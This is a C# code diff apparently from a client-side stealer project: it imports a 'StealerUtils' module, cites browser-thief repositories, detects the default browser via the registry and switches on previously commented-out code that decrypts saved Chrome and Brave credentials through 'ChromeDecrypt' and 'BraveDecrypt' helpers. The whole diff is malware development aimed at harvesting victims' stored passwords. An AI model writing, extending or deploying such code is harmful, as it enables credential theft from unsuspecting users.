@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Client_side.StealerUtils;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -12,26 +13,27 @@ namespace Client_side
         // https://github.com/LimerBoy/FireFox-Thief/
         // https://github.com/simpleperson123/ChromeDecryptor/
 
-        private static readonly string[] Browser =
+        private static readonly string[] SupportedBrowser =
         {
             "Google Chrome",
-            "Mozilla Firefox",
             "Microsoft Edge",
+            "Brave Browser",
         };
 
         private static int IdentifyUserBrowser()
         {
             // Identify the default browser
-            string defaultBrowser = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\http\shell\open\command", null, null).ToString();
+            string reg_key = @"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Associations\URLAssociations\http\UserChoice";
+            string defaultBrowser = (string)Microsoft.Win32.Registry.GetValue(reg_key, "Progid", null);
             if (defaultBrowser.Contains("chrome"))
             {
                 return 1;
             }
-            else if (defaultBrowser.Contains("firefox"))
+            else if (defaultBrowser.Contains("msedge"))
             {
                 return 2;
             }
-            else if (defaultBrowser.Contains("edge"))
+            else if (defaultBrowser.Contains("brave") || defaultBrowser.Contains("Brave"))
             {
                 return 3;
             }
@@ -41,18 +43,25 @@ namespace Client_side
         public static List<string> GetCredentials()
         {
             List<string> credentials = new();
-            //switch (IdentifyUserBrowser())
-            //{
-            //    case 1:
-            //        credentials.AddRange(Chrome.GetCredentials());
-            //        break;
-            //    case 2:
-            //        credentials.AddRange(Firefox.GetCredentials());
-            //        break;
-            //    case 3:
-            //        credentials.AddRange(Edge.GetCredentials());
-            //        break;
-            //}
+            switch (IdentifyUserBrowser())
+            {
+                case 1:
+                    {
+                        credentials = ChromeDecrypt.MainFunction();
+                        break;
+                    }
+                case 2:
+                    break;
+                case 3:
+                    {
+                        credentials = BraveDecrypt.MainFunction();
+                        break;
+                    }
+                default:
+                    {
+                        return new List<string> { Encryptor.ConvertStr("Browser not supported!") };
+                    }
+            }
             return credentials;
         }
 
